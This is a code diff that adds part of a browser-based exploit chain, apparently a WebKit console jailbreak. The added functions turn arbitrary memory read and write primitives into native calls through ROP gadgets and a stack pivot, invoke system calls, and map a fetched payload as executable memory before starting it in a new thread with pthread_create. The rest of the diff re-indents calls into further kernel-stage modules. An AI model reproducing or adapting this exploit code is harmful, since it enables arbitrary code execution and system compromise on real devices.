@@ -837,6 +837,168 @@ let allDone = false,
       return;
     }
 
+
+    function bufAddr(ab) {
+      const c = p.leakval(ab);
+      return p.read8(
+        p
+          .read8(c.add32(off.wk_ArrayBuffer_m_impl))
+          .add32(off.wk_ArrayBuffer_m_contents_m_data),
+      );
+    }
+    function put(dv, at, v) {
+      if (typeof v === "number") {
+        dv.setUint32(at, v >>> 0, true);
+        dv.setUint32(at + 4, v < 0 ? 0xffffffff : 0, true);
+      } else {
+        dv.setUint32(at, v.low >>> 0, true);
+        dv.setUint32(at + 4, v.hi >>> 0, true);
+      }
+    }
+    const PB_SIZE = Math.max(0x28, (off.pivot_view_sp + 8 + 0xf) & ~0xf);
+    function makeCtx() {
+      const sb = new ArrayBuffer(0x20),
+        pb = new ArrayBuffer(PB_SIZE);
+      const kb = new ArrayBuffer(0x2000),
+        fb = new ArrayBuffer(0x40);
+      keepAlive.push(sb, pb, kb, fb);
+      const c = {
+        storeDv: new DataView(sb),
+        pivotDv: new DataView(pb),
+        stackDv: new DataView(kb),
+        frameDv: new DataView(fb),
+        stackU8: new Uint8Array(kb),
+        frameU8: new Uint8Array(fb),
+      };
+      keepAlive.push(
+        c.storeDv,
+        c.pivotDv,
+        c.stackDv,
+        c.frameDv,
+        c.stackU8,
+        c.frameU8,
+      );
+      c.S = bufAddr(sb);
+      c.P = bufAddr(pb);
+      c.K = bufAddr(kb);
+      c.F = bufAddr(fb);
+      put(c.storeDv, 0x00, G.G1);
+      put(c.storeDv, 0x08, c.P);
+      put(c.storeDv, 0x10, G.G3);
+      put(c.storeDv, 0x18, G.G2);
+      put(c.pivotDv, 0x00, c.P);
+      put(c.pivotDv, 0x10, G.G5);
+      put(c.pivotDv, 0x20, G.G4);
+      return c;
+    }
+    function layout(c, target, args) {
+      c.stackU8.fill(0);
+      c.frameU8.fill(0);
+      const insts = [];
+      for (let i = 0; i < args.length; ++i) {
+        insts.push(argGadget[i]);
+        insts.push(args[i]);
+      }
+      const targetIdx = insts.length;
+      insts.push(target);
+      insts.push(G.POP_RDI_RET);
+      insts.push(c.F);
+      insts.push(G.MOV_RDI_RAX_RET);
+      insts.push(G.POP_RAX_RET);
+      insts.push(JSVALUE_UNDEFINED);
+      insts.push(G.LEAVE_RET);
+      let at = 0x2000 - 8 * insts.length;
+      if (((c.K.low + at + 8 * targetIdx) & 0xf) !== 0) at -= 8;
+      for (let i = 0; i < insts.length; ++i)
+        put(c.stackDv, at + 8 * i, insts[i]);
+      put(c.pivotDv, off.pivot_view_sp, c.K.add32(at));
+    }
+    const M = makeCtx();
+    mainMf = p.read8(cell.add32(0x18)).add32(off.wk_JSFunction_m_function);
+    mainOrig = p.read8(mainMf);
+    const pivotObj = {};
+    keepAlive.push(pivotObj);
+    const pivotCell = p.leakval(pivotObj);
+    p.write8(mainMf, G.G0);
+    mainArmed = true;
+    function callAddr(target, args) {
+      layout(M, target, args);
+      const saved = p.read8(pivotCell);
+      p.write8(pivotCell, M.S);
+      Math.expm1(pivotObj);
+      p.write8(pivotCell, saved);
+      return {
+        lo: M.frameDv.getUint32(0, true),
+        hi: M.frameDv.getUint32(4, true),
+        i32: M.frameDv.getUint32(0, true) | 0,
+      };
+    }
+    const sc = (num, ...a) => callAddr(stubAddr.get(num), a);
+    closeFd = (fd) => sc(SYS.close, fd).i32;
+    function errno() {
+      const r = callAddr(errorFn, []);
+      const a = new int64(r.lo, r.hi);
+      return a.hi === 0 && a.low === 0 ? -1 : p.read4(a) | 0;
+    }
+    async function relaunchPayload() {
+      let blob = null;
+      try {
+        const r = await fetch(PAYLOAD_FILE);
+        if (r.ok) blob = new Uint8Array(await r.arrayBuffer());
+      } catch (e) {}
+      if (!blob || blob[0] !== 0xe9) {
+        mark("JB-RELAUNCH", "file=" + PAYLOAD_FILE + " blob=unusable");
+        return;
+      }
+      const sz = (blob.length + 0x3fff) & ~0x3fff;
+      const m = sc(SYS.mmap, 0, sz, 7, 0x1002, -1, 0);
+      const entry = new int64(m.lo, m.hi);
+      if (m.i32 === -1 || entry.hi >>> 0 === 0) {
+        mark("JB-RELAUNCH", "mmap failed err=" + errno());
+        return;
+      }
+      for (let o = 0; o < blob.length; o += 8) {
+        let lo = 0,
+          hi = 0;
+        for (let k = 0; k < 4; k++) lo |= (blob[o + k] || 0) << (8 * k);
+        for (let k = 0; k < 4; k++) hi |= (blob[o + 4 + k] || 0) << (8 * k);
+        p.write8(entry.add32(o), new int64(lo >>> 0, hi >>> 0));
+      }
+      let bad = -1;
+      for (let o = 0; o < blob.length && bad < 0; o++)
+        if (p.read1(entry.add32(o)) !== blob[o]) bad = o;
+      if (bad >= 0) {
+        mark("JB-RELAUNCH", "copy MISMATCH@0x" + bad.toString(16));
+        return;
+      }
+      const fn = p.read8(webkitBase.add32(off.wk___imp_pthread_create));
+      const expect = libkernelBase.add32(off.k_pthread_create);
+      if (fn.low !== expect.low || fn.hi !== expect.hi) {
+        mark("JB-RELAUNCH", "pthread_create got=" + fn + " want=" + expect);
+        return;
+      }
+      const thr = new ArrayBuffer(8);
+      keepAlive.push(thr);
+      new Uint8Array(thr).fill(0);
+      const rc = callAddr(expect, [bufAddr(thr), 0, entry, 0]).i32;
+      const tdv = new DataView(thr);
+      const handle = new int64(tdv.getUint32(0, true), tdv.getUint32(4, true));
+      payloadRunning = rc === 0 && handle.hi >>> 0 > 0;
+      check(
+        "JB-RELAUNCH",
+        payloadRunning,
+        "file=" +
+          PAYLOAD_FILE +
+          " bytes=" +
+          blob.length +
+          " pthread_create=" +
+          rc +
+          " handle=" +
+          handle,
+      );
+    }
+
+    
     if (params.get("hx1400") === "1") {
       try {
         const hx = await import("./hx1400_port.js?v=6");
@@ -844,33 +1006,33 @@ let allDone = false,
         if (params.get("kv") === "1") {
           mark("KV-START", "entering kv path");
           try {
-          await hx.runHx1400({
-            p: p, sc: sc, callAddr: callAddr, bufAddr: bufAddr, errno: errno,
-            webkitBase: webkitBase, libkernelBase: libkernelBase, G: G,
-            stubAddr: stubAddr, int64: int64, params: params, keepAlive: keepAlive,
-            mark: mark, trace: trace, state: state, check: check,
-            fetchFile: async function (path) {
-              const response = await fetch(path);
-              if (!response.ok) throw new Error(path + " HTTP " + response.status);
-              return new Uint8Array(await response.arrayBuffer());
-            },
-          });
-          const kvb = await import("./hx_kevent.js?v=1");
-          const kvOk = await kvb.runKevent({
-            p: p, sc: sc, callAddr: callAddr, bufAddr: bufAddr, errno: errno,
-            webkitBase: webkitBase, libkernelBase: libkernelBase, G: G,
-            stubAddr: stubAddr, int64: int64, params: params, keepAlive: keepAlive,
-            mark: mark, trace: trace, state: state, check: check,
-            fetchFile: async function (path) {
-              const response = await fetch(path);
-              if (!response.ok) throw new Error(path + " HTTP " + response.status);
-              return new Uint8Array(await response.arrayBuffer());
-            },
-            kbase: globalThis.__HX_KBASE,
-          });
-          allDone = true;
-          finishUI(kvOk === true);
-          return;
+            await hx.runHx1400({
+              p: p, sc: sc, callAddr: callAddr, bufAddr: bufAddr, errno: errno,
+              webkitBase: webkitBase, libkernelBase: libkernelBase, G: G,
+              stubAddr: stubAddr, int64: int64, params: params, keepAlive: keepAlive,
+              mark: mark, trace: trace, state: state, check: check,
+              fetchFile: async function (path) {
+                const response = await fetch(path);
+                if (!response.ok) throw new Error(path + " HTTP " + response.status);
+                return new Uint8Array(await response.arrayBuffer());
+              },
+            });
+            const kvb = await import("./hx_kevent.js?v=1");
+            const kvOk = await kvb.runKevent({
+              p: p, sc: sc, callAddr: callAddr, bufAddr: bufAddr, errno: errno,
+              webkitBase: webkitBase, libkernelBase: libkernelBase, G: G,
+              stubAddr: stubAddr, int64: int64, params: params, keepAlive: keepAlive,
+              mark: mark, trace: trace, state: state, check: check,
+              fetchFile: async function (path) {
+                const response = await fetch(path);
+                if (!response.ok) throw new Error(path + " HTTP " + response.status);
+                return new Uint8Array(await response.arrayBuffer());
+              },
+              kbase: globalThis.__HX_KBASE,
+            });
+            allDone = true;
+            finishUI(kvOk === true);
+            return;
           } catch (kvError) {
             mark(
               "KV-THREW",
